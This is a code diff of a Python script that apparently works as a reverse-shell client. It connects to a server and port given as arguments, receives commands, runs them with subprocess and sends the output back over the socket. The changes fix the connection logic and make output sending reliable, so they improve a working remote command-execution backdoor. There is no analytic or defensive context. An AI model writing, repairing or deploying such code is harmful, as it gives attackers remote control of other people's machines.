@@ -9,9 +9,7 @@ def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
-    while True:
-        s.connect((args.server, args.port))
-
+    s.connect((args.server, args.port))
     while True:
         try:
             received = s.recv(buff).strip().split()
@@ -23,7 +21,7 @@ def main():
             else:
                 print(command)
                 output = subprocess.run(command, stdout=subprocess.PIPE)
-                s.send(bytes(output.stdout))
+                s.sendall(bytes(output.stdout))
         except OSError as err:
             print("{0}\n".format(err))
 
